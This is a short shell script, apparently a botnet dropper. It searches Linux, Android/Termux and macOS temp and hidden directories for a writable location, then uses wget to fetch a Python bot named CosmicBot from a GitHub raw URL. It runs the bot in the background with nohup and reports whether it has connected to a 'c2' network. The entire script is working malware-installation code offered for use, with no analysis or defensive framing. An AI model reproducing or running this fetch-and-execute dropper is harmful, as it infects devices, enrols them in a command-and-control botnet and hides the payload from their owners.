for p in /tmp /var/tmp /dev/shm \
         /data/data/com.termux/files/usr/tmp \
         /data/data/com.termux/files/usr/var/tmp \
         $HOME/.cache $HOME/.local/tmp $HOME/.config/tmp \
         $HOME/.temp $HOME/.hidden $HOME/.cosmic \
         /sdcard/Android/data/.hidden/tmp \
         /private/tmp /usr/local/tmp; do

  if [ -d "$p" ] && [ -w "$p" ]; then
    cd "$p"
    wget -q https://raw.githubusercontent.com/B3RT1337/CosmicBot/refs/heads/main/CosmicBot.py -O CosmicBot.py
    nohup python3 CosmicBot.py > cosmicbot.log 2>&1 &
    sleep 1

    if pgrep -f "CosmicBot.py" > /dev/null; then
      clear 2>/dev/null
      echo "You are now connected to CosmicNetwork!"
    else
      echo "Error, can't connect to c2"
    fi
    exit
  fi
done

echo "No valid hidden path found!"
